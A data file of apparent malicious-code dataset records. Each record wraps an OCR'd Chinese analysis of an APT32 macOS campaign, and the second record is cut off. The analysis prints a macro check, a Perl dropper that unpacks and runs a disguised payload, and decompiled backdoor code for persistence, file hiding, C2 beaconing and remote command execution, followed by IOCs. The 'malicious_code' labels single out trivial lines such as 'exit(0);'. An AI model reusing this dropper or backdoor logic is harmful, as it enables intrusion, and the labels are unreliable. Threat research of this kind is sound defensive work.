{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "exit(0);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 Parser::inByte((Parser \\*)v67, byte_10001541A); 238 Parser::inByte((Parser \\*)v67, v14); 239 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)osVersion, \\*((_DWORD \\*)osVersion - 6)); 240 Parser::inByte((Parser \\*)v67, 0x74u); 241 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)userName, \\*((_DWORD \\*)userName - 6)); 242 Parser::inString((Parser \\*)v67, (unsigned _int8 \\*)computerName, \\*((_DWORD \\*)computerName - 6)); 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10000808) 00000804_2N8HandlePP10infoClientEv:230 (100000084) 00000804_2N8HandlePP10infoClientEv:230 (100008084) 00000804_2N8HandlePP10infoClientEv:230 (10  \n\nSTRINGDATA::GET_PATH_INFO方法执行后会解密出一段路径。  \n\n非Root用户路径：  \n\n- /Library/PubSub/Feeds/db.sqlite3  \n\nz6 1 27 v3 = strlen(v2); 28 plain = (char \\*)get_plain((unsigned _int8 \\*)v2, v3, KEY, KEYLENGTH, 1); 29 v5 char \\*plain; // rbx 30 std 0x1003042B0LL:\"~/Library/PubSub/Feeds/db.sqlite3\" 31 if (plain) 32 free(plain); 33 return this; 34 }  \n\nRoot用户路径：  \n\n/Library/Modem Scripts/Motorola BitsURFR 56K.ccl/Contents/Resources/Motorola.rbon.framework/Versions/A/Framework\n\n<--- Page Split --->\n\n*左右滑动查看更多  \n\n![](images/13_0.jpg)\n  \n\n内容为用作识别客户端身份的唯一ID：  \n\n{hep@hepdeMac Feeds % xxd db.sqlite3 00000000: 8ba2 1b12 e0f8 45d8 ca80 a213 e770 7481 ....E......pt. 0000010: c7eb 623d 78ea 561a bea5 7df8 0b26 3d3f .b=x.V...}.&=? hep@hepdeMac Feeds %  \n\n调用hiddenFile / setTimeFile方法隐藏文件，随机化创建时间：  \n\n![](images/13_1.jpg)\n  \n\n加密搜集到的信息：\n\n<--- Page Split --->\n\n230 Arch = HandlePP::getArch((HandlePP *)&computerName); 231 pid = getpid(); 232 std::string::string(std::string *)&v68, (const std::string *)&HandlePP::pathProcess); 233 Parser::Parser((Parser *)v67); 234 Parser::inBytes((Parser *)v67, &HandlePP::clientID, &x1u); 235 Parser::inByte((Parser *)v67, &x31u); 236 Parser::inByte((Parser *)v67, &x3Du); 237 Parser::inByte((Parser *)v67, byte_10001541A); 238 Parser::inByte((Parser *)v67, v14); 239 Parser::inString((Parser *)v67, (unsigned _int8 *)osVersion, *((_DWORD *)osVersion - 6)); 240 Parser::inByte((Parser *)v67, &x74u); 241 Parser::inString((Parser *)v67, (unsigned _int8 *)userName, *((_DWORD *)userName - 6)); 242 Parser::inString((Parser *)v67, (unsigned _int8 *)computerName, *((_DWORD *)computerName - 6)); 243 Parser::inLong((Parser *)v67, HandlePP::installTime); 244 Parser::inByte((Parser *)v67, Arch); 245 Parser::inInt((Parser *)v67, pid); 246 Parser::inString((Parser *)v67, v68, *((_DWORD *)v68 - 6)); 247 Parser::getDataVector((Parser *)v66); 248 std::vector<unsigned char>::vector(v66, v66); 249 Packet::Packet(v61, v60, 7LL, 0LL, 0LL); 250 if (v60[0]) 251 operator delete(v60[0]); 252 v59 = 0; 253 Packet::getArrayBytes((Packet *)v58, (bool *)v61); 254 if (v59) 255 { 256 v23 = 0; 257 goto LABEL_98; 258 }  \n\n获取c2域名ssl.arkouthrie.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100404990LL:\"ssl.arkouthrie.com\" 42 free(plain);  \n\n备用C2域名s3.hiahornber.com。  \n\n37 v3 = strlen(v2); 38 plain = (char *)get_plain((unsigned _int8 *)v2, v3, KEY, KEYLENGTH, 1); 39 v5 = strlen(sslen); 40 std::char *plain; // rbx 41 if (0x100405AB0LL:\"s3.hiahornber.com\" 42 free(plain);  \n\n备用C2域名ssl.arkouthrie.com。  \n\n24 v5 = (unsigned _int8 *)strlen(v3); 25 plain = (char *)get_plain((AES256 *)v3, v5, KEY, KEYLENGTH, 1); 26 v7 = char *plain; // rbx 27 std::0x100307450LL:\"ssl.arkouthrie.com\" 28 if (plain) 29 free(plain); 30 return this;\n\n<--- Page Split --->\n\n拼接请求：  \n\nhttp://ssl.arkouthrie.com/v3/yQ/r/eiCu1gd6Qme.js  \n\n*左右滑动查看更多  \n\n![](images/15_0.jpg)\n  \n\n调用Connector::postHttp发送数据：  \n\n![](images/15_1.jpg)\n  \n\n## 远程控制  \n\nHandlePP::runHandle部分主要功能为请求C2、接收指令并执行：\n\n<--- Page Split --->\n![](images/16_0.jpg)\n  \n\n进入 HandlePP::requestServer 方法。  \n\n解密并拼接请求后，通过 Packet::getCommand 获取控制命令：  \n\n![](images/16_1.jpg)\n  \n\n受控命令功能分析：\n\n<--- Page Split --->\n\n\n<table><tr><td>0x33</td><td>获取文件大小</td></tr><tr><td>0xE8</td><td>退出进程</td></tr><tr><td>0xA2</td><td>远程下载文件并执行</td></tr><tr><td>0xA1</td><td>执行系统命令</td></tr><tr><td>0x48</td><td>删除文件</td></tr><tr><td>0x72</td><td>文件上传</td></tr><tr><td>0x23/0x3C</td><td>文件下载</td></tr></table>  \n\nCommand \\(= = 0x33\\) 获取文件大小  \n\nif（Command \\(= = 0x33\\) ）{ std::vector<unsigned char>::vector(v103,&v130); Converter::Converter(v104,v103); if（v103[0]） operator delete(v103[0]); \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v102); \\(\\mathrm{v31} = \\mathrm{v102}\\) if（\\\\*(_QWORD \\\\*)（v102- 24）） { \\(\\mathrm{v5} = \\mathrm{v104}\\) Converter::outString((Converter \\\\*)&v101); \\(\\mathrm{v32} = \\mathrm{v101}\\) if（\\\\*(_QWORD \\\\*)v101- 3）） { std::string::string((std::string \\\\*)&v100,（const std::string \\\\*)&v101); FileSize \\(=\\) getFileSize((const std::string \\\\*)&v100);//获取文件大小 \\(\\mathrm{v34} = \\mathrm{v100} - 24\\) if（_UNKNOWN \\\\*)（v100- 24） \\(! =\\) &std::string::_Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed int32 \\\\*)（v100- 8),0xFFFFFFFF) \\(< = 0\\) { std::string::_Rep::_M_destroy(v34,v152); } \\(\\mathrm{v35} = 122\\) if（FileSize \\(! = - 1\\) ） \\(\\mathrm{v35} = \\mathrm{0}\\) \\(\\mathrm{v36} = 21\\)\n\n<--- Page Split --->\n\nif（Command \\(= = 0\\times E8\\) ）{ std::vector<unsigned char>::vector(v109,&v130); Converter::Converter(v110,v109); if（v109[0]） operator delete(v109[0]); v5 \\(= v110\\) . Converter::outString((Converter \\\\*)&v108); if（\\\\*（_QWORD\\\\*)（v108- 24）） { std::string::string(std::string \\\\*)&v107,（const std::string \\\\*)&v108); std::vector<unsigned char>::vector(v106,v140); std::string::string(std::string \\\\*)&v105,（const std::string \\\\*)&v128); HandlePP::respondServer((std::string \\\\*)&v107,（_int64)v106,（const std::string \\\\*)&v105); v60 \\(= v105 - 24\\) if（_UNKNOWN\\\\*)（v105- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v105- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v60,v152); } if（v106[0]） operator delete(v106[0]); v61 \\(= v107 - 24\\) if（_UNKNOWN\\\\*)（v107- 24） \\(! =\\) &std::string::Rep::_S_empty_rep_storage &&_InterlockedExchangeAdd((volatile signed _int32 \\\\*)（v107- 8),0xFFFFFFFF) \\(< = 0\\) ） { std::string::_Rep::_M_destroy(v61,v152); } exit(0); }  \n\nCommand \\(= = 0\\times \\mathrm{A2}\\) &&Command \\(= = 0\\times \\mathrm{A1}\\)  \n\nif（Command \\(> 0\\times \\mathrm{A1}\\) ） { if（Command \\(= = 0\\times \\mathrm{A2}\\) ） { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondLoadLunaThread,v44);//远程下载文件并执行 } else { v29 \\(= 1\\) . v5 \\(=\\) （char \\\\*)&v153; pthread_create(&v84,&v153,respondRunTerminalThread,v44);//执行系统命令 } goto LABEL_163; } if（Command \\(> 71\\) ）  \n\nrespondLoadLunaThread线程分析（功能：下载文件并执行）  \n\n如果已执行就删除执行文件。\n\n<--- Page Split --->\n\nv3 = a1 + 3; std::vector<std::string>::push_back(&v33, a1 + 33); if (v2 == 178 && *((_DWORD *)a1 + 6) == 162 ) { if ((unsigned _int8)is_file_exist(_filename) )//判断文件存在 { a1[28] = 36; } else if (!fopen(_filename, \"w\")) { fclose(0LL); } v4 = a1 + 28; if (!a1[28]) { std::string::string((std::string *)&v32, (const std::string *)&_filename); v5 = checkProcessExist(&v32); //判断进程存在 v6 = v32 - 24; if ((_UNKNOWN *)v32 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v32 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v6, v40); } if (v5) { v4 = 126; std::string::string((std::string *)&v31, (const std::string *)&_filename); removeFile(&v31); //删除文件 v7 = v31 - 24; if ((_UNKNOWN *)v31 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v31 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v7, v40); } } } else { v4 = a1 + 28; } } else { if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *)v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; }  \n\n未执行就写入磁盘并执行。  \n\nif (!v4) { std::string::string((std::string *)&v30, (const std::string *)&_filename); std::vector<unsigned char>::vector(&v29, v35); *(_DWORD *) (a1 + 29) = HandlePP::loadLuna((std::string *)&v30);//写入并执行文件 if (v29) operator delete(v29); v8 = v30 - 24; if ((_UNKNOWN *) (v30 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed _int32 *) (v30 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v8, v40); } if (*(_DWORD *) (a1 + 29) ) { v4 = 18; } }  \n\nrespondRunTerminalThread 线程分析（功能：执行系统命令）\n\n<--- Page Split --->\n\n8 std::vector<unsigned char>::vector(v24, a1); 9 Converter::Converter(v25, v24); 0 if (v24[0] ) 1 operator delete(v24[0]); 2 Converter::outString((Converter \\*)&v23); 3 Converter::outString((Converter \\*)&v22); 4 v2 = Converter::outShort((Converter \\*)v25); 5 v21 = (_int64)&std::string::_Rep::_S_empty_rep_storage + 24; 6 std::string::string((std::string \\*)&v20, (const std::string \\*)&v22); 7 \\*(_DWORD \\*)(a1 + 29) = HandlePP::runCommand(&v20, (unsigned int)v2, &v21); 8 v3 = v20 - 24; 9 if ((_UNKNOWN \\*)v20 - 24) != &std::string::_Rep::_S_empty_rep_storage 0 &&_InterlockedExchangeAdd((volatile signed __int32 \\*)v20 - 8), 0xFFFFFFFF) <= 0 ) 1 2 std::string::_Rep::_M_destroy(v3, v26); 3 4 if (\\*(_DWORD \\*)(a1 + 29) ) 5 a1[28] = 18; 6 7  \n\nCommand \\(= = 0\\times 48\\) 删除文件  \n\nif ( Command \\(= = 0\\times 48\\) ) { std::vector<unsigned char>::vector(v82, &v130); Converter::Converter(v83, v82); if ( v82[0] ) operator delete(v82[0]); v5 = v83; Converter::outString((Converter \\*)&v81); v47 = v81; if (\\*(_QWORD \\*)v81 - 3) { v5 = v83; Converter::outString((Converter \\*)&v80); v48 = v80; if (\\*(_QWORD \\*)v80 - 24) { std::string::string((std::string \\*)&v79, (const std::string \\*)&v81); v49 = removefile(&v79); v50 = v79 - 24; if ((_UNKNOWN \\*)v79 - 24) != &std::string::_Rep::_S_empty_rep_storage && _InterlockedExchangeAdd((volatile signed __int32 \\*)v79 - 8), 0xFFFFFFFF) <= 0 ) { std::string::_Rep::_M_destroy(v50, v152); } if ( v49 ) v51 = 99;  \n\nCommand \\(= = 0\\times 72\\) 文件上传  \n\nif ( Command \\(= = 0\\times 72\\) ) { v29 = 1; v5 = (char \\*)&v153; pthread_create(&v84, &v153, respondUploadThread, v44); goto LABEL_163; }\n\n<--- Page Split --->\n\nCommand \\(= =\\) ox23 || Command \\(= =\\) ox3C文件下载  \n\nelse if ( Command \\(= =\\) ox23 || Command \\(= =\\) ox3C) { v29 = 1; v5 = (char \\\\*)&v153; pthread_create(&v84, &v153, (void \\\\*(_cdecl \\\\*)(void \\\\*))respondownloadThread, v44); goto LABEL_163; } if ( \\\\*v46 ) operator delete(\\*v46);  \n\n04  \n\n关联分析  \n\n根据样本行为特征、C2以及结合开源情报，确定此次攻击活动背后的组织为“海莲花”APT。  \n\n4.1  \n\n宏文档钓鱼  \n\n海莲花经常使用Word宏进行钓鱼攻击，文件普遍为.doc结尾的MHT恶意文档。本次攻击活动样本同样使用.doc结尾带有宏的MHT恶意文档。  \n\n4.2  \n\nC2特征  \n\n在海莲花历史样本（firefox.dmg)中，发现了与本次攻击相同的C2回连URL与本次攻击活动样本相符(/v3/yQ/r/eiCu1gd6Qme.js)。\n\n<--- Page Split --->\n\n## C2服务器  \n\n本次攻击活动样本的C2服务器：  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.csshttp:/  \n\n\\\\*左右滑动查看更多  \n\nIOC:  \n\nHASH:  \n\nSHA256:2BB855DC5D845EB5F2466D7186F150C172DA737BFD9C7F6BC1804E0B8D20F22A (2018- PHIEU GHI DANH THAM DU' TINH HOI HMDC 2018. doc)  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4 (syslogd)  \n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4docddc4f01fe32f369f6a845c8f (screenassistantd / spellagentd)  \n\nC2:  \n\nhttp://ssl.arkouthrie[.]com/appleauth/static/cssj/N252394295/widget/auth/app.css  \n\nhttp://ssl.arkouthrie[.]com/v3/yQ/r/eiCu1gd6Qme.js  \n\n## 一往期回顾  \n\n![](images/22_0.jpg)\n\n\n<--- Page Split --->\n![](images/23_0.jpg)\n  \n\n关于安恒信息安全服务团队  \n\n安恒信息安全服务团队由九维安全能力专家构成，其职责分别为：红队持续突破、橙队擅于赋能、黄队致力建设、绿队跟踪改进、青队快速处置、蓝队实时防御，紫队不断优化、暗队专注情报和研究、白队运营管理，以体系化的安全人才及技术为客户赋能。\n\n<--- Page Split --->\n![](images/24_0.jpg)\n  \n\n收录于合集 #九维技术团队  \n\n140个下一篇九维团队- 青队（处置）|关于github上某免杀loader后门事件的分析\n\n<--- Page Split --->", "format_code": "exit(0);", "hash_code": "e07eb0beb5800d876d8ca9406406f88edf6a8acc07cff2dde8c8b41cf5750d9c", "hash": "hash"}
{"file_name": "10cad491-31f3-4014-a017-27fa5b03b393_APT32.md", "title": "执行流程图", "malicious_code": "removeFile(&v31);", "describe": "<--- Page Split --->\n![](images/2_0.jpg)\n  \n\n3- 3  \n\n分析过程  \n\n#### 3.3.1 第一阶段分析  \n\n样本启动后文档内容如下，诱导用户启用宏：\n\n<--- Page Split --->\n![](images/3_0.jpg)\n  \n\n恶意文档首先判断系统版本，如果32位系统会尝试加载\"libc.dylib\"中的导出函数system，用来执行系统命令。如果是64位系统则将文档正文设置为白色，并隐藏文字，伪装成空白文档迷惑受害者。  \n\n![](images/3_1.jpg)\n\n\n<--- Page Split --->\n\n判断系统类型，如果是MacOS系统则继续执行。  \n\nSub Jurvq86PFf2PkeTyWNjv() Dim strString1 As String strString1 = \"\\*Mac\\*\" If Application.system.OperatingSystem Like strString1 Then If Val(Application.Version) < 15 Then fsDcrRr0qMRSMIMmFuWL End If End If End Sub  \n\n将当前文档所在路径拼接进Perl脚本内：  \n\n最后输出的Perl脚本会从文档中解压出themeo.xml文件，添加可执行权限并执行。\n\n<--- Page Split --->\n\n1 #!/usr/bin/perl  2 use File::Copy;  3 $pathFolderFile = \"/tmp/system\";  4 $pathFile = $pathFolderFile . \"/system\";  5 $path = \"/Volumes/\". chr(0x52) . chr(0x3A);  6 $path =~ tr://\\//;mkdir($pathFolderFile);  7 copy($path, $pathFile);  8 system(\"unzip \". $pathFile . \"- d \". $pathFolderFile);  9 system(\"chmod +x \\\"\". $pathFolderFile . \"/word/theme/theme0.xml\\\"\");  10 move(\"$pathFolderFile/word/theme/theme0.xml\", \"$pathFolderFile/word/theme/syslogd\");  11 system(\"\\\"$pathFolderFile/word/theme/syslogd\\\" &\");  12 sleep(1);  13 system(\"rm -Rf /tmp/system\");  14 system(\"rm /tmp/modern\");  15  \n\n#### 3.3.2 第二阶段分析  \n\n文件名：syslogd  \n\nSHA256:4DA8365241C6B028A13B82D852C4F0155EB3D902782C6A538AC007A44A7D61B4SHA1:CE3E827BCC426AEA70447C2D6FF52C2B239DB33EMD5:DA71B64E77AD45BAB56CF71ECD4F55D4  \n\n生成时间：2018- 02- 14 09:58:54 UTC  \n\n## 核心功能实现在setStartup方法内。  \n\n1 int __cdecl main(int argc, const char **argv, const char **envp) {  2 int v3; // eax  3 char buffer[2008]; // [rsp+0h] [rbp- 7F0h] BYREF  4  5 setStartup();  6 v3 = getpid();  7 proc_pidpath(v3, buffer, 0x7D0u);  8 remove(buffer);  9 return 0;  10 }\n\n<--- Page Split --->\n\nisRootUser = isRoot(); GET_PROCESSPATH((std::string \\*)&path, isRootUser);// 解密后门路径 std::string::string(&v64, path, v63); convertPathUser(&v64, __s); v1 = v64 - 24; if ((__UNKNOWN \\*) (v64 - 24) != &MEMORY[0x7FFF870371F0] && __InterlockedExchangeAdd((volatile signed __int32 \\*) (v64 - 8), 0xFFFFFFFF) <= 0) { std::string::_Rep::_M_destroy(v1, v98); } v2 = strlen(__s); std::string::assign((std::string \\*)&path, __s, v2); createFolder(path); GET_PROCESSNAME((std::string \\*)&v62, isRootUser);// 解密进程名 fileName = v62; filePath = appendPathComponent(path, v62); // 拼接路径和进程名 if ((unsigned __int8)Loader::installLoader(filePath, fileName)) { hiddenFile(filePath); // 隐藏文件 setTimeFile(filePath); // 随机修改创建时间 } if (filePath) { free(filePath); } if (isRootUser) { v94 = (char \\*)&MEMORY[0x7FFF870371F0] + 24; if ((unsigned __int8)isRoot()) { n1n - /h-n \\*1n+ n1n/n  \n\n首先会判断是否为Root用户，根据权限将后门文件写入不同的路径中。  \n\nGET_PROCESSPATH方法为解密字符串，样本内所有字符串均使用该方法加密。  \n\n1 std::string \\\\*_fastcall GET_PROCESSPATH(std::string \\\\*this, char a2) 2 unsigned _int8 \\\\*v3; // rdi bool v4; // zf unsigned _int64 v5; // rsi char \\\\*plain; // rbx unsigned _int64 v7; // rax 9 \\\\*(_QWORD \\\\*)this = (char \\\\*)&std::string::_Rep::_S_empty_rep_storage + 24; v3 = \"a0edx0qnx17FJEtC6FpDxQnJt5GHZIBJBsTgiwNisAs\"; v4 = a2 == 0; if (a2) v3 = \"4dH/0ppoS1Wb+VK6IZYxSyuOZm9aG4Jd6ymlask23NG17syz26NLwMznGyITuDw80V5X4Stx958H/Z/Xit5XLKnJ+Am6VhpAgll+JED85pgIn\" \"kks8dVkmDet/Ywx/M\"; v5 = 44LL; if (1v4) v5 = 128LL; plain = (char \\\\*)get_plain(v3, v5, KEY, KEYLENGTH, 1); v7 = strlen(plain); std::string::assign(this, plain, v7); if (plain) free(plain); return this;  \n\n加密方式为AES256，密钥长度20个字节。\n\n<--- Page Split --->\n![](images/7_0.jpg)\n  \n\n解密的硬编码路径为：  \n\n有root权限：  \n\n/Library/CoreMediaIO/Plug- Ins/FCP- DAL/i0SScreenCapture.plugin/Contents/Resources  \n\n左右滑动查看更多\n\n<--- Page Split --->\n![](images/8_0.jpg)\n  \n\n无root权限：  \n\n~/Library/Spelling/  \n\n![](images/8_1.jpg)\n  \n\n解密出进程名：  \n\nRoot用户：screennassistant非Root用户：spellagentd\n\n<--- Page Split --->\n![](images/9_0.jpg)\n  \n\n后门安装方法主要实现在Loader::installLoader内，从自身读取出第三阶段可执行文件，写入磁盘。  \n\n![](images/9_1.jpg)\n\n\n<--- Page Split --->\n\n通过文件头判断出后门为Mach- O可执行文件。  \n\n![](images/10_0.jpg)\n  \n\nsetTimeFile方法会调用系统命令修改文件创建时间，解密出的命令行为：  \n\ntouch - t 1407260241 \\\"/Users/hep/Library/Spelling/spellagentd\\\" > /dev/null  \n\n\\*左右滑动查看更多  \n\n如果当前是root用户，还会解密出路径/Library/LaunchDaemons/，并创建服务文件/Library/LaunchDaemons/com.apple.screen.assistantd.plist  \n\n\\*左右滑动查看更多\n\n<--- Page Split --->\n\nSHA256:673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f  \n\nSHA1:91c6ac1f84e2f8a4cf0f8e4d5c8590fc3c1ocf08  \n\nMD5:306d3ed0a7c899b5ef9d0e3c91f05193  \n\n核心功能点在HandlePP::infoClient与HandlePP::runHandle两个方法里，infoClient负责信息搜集，runHandle负责执行C2命令：  \n\n![](images/11_0.jpg)\n  \n\n## 信息搜集  \n\nHandlePP::infoClient方法搜集系统信息，如安装时间、系统版本、用户名、计算机名等，加密后回传C2。\n\n<--- Page Split --->\n\n{ clientID = (_OWORD \\*)HandlePP::getClientID(v5); \\*(_OWORD \\*)&HandlePP::clientID = \\*ClientID; if (ClientID) free(ClientID); HandlePP::installTime = time(0LL); v7 = malloc(0x7D0uLL); bzero(v7. 0x7D0uLL):  \n\n225 if (!(unsigned _int8)isRoot()) 226 v14 = 72; 227 HandlePP::getOSVersion((HandlePP \\*)&osVersion); 228 HandlePP::getUsername((HandlePP \\*)&userName); 229 HandlePP::getComputerName((HandlePP \\*)&computerName); 230 Arch = HandlePP::getArch((HandlePP \\*)&computerName); 231 v16 = getpid(); 232 std::string::string((std::string \\*)v68, (const std::string \\*)&HandlePP::pathProcess); 233 Parser::Parser((Parser \\*)v67); 234 Parser::inBytes((Parser \\*)v67, &HandlePP::clientID, 0x10u); 235 Parser::inByte((Parser \\*)v67, 0x31u); 236 Parser::inByte((Parser \\*)v67, 0x30u); 237 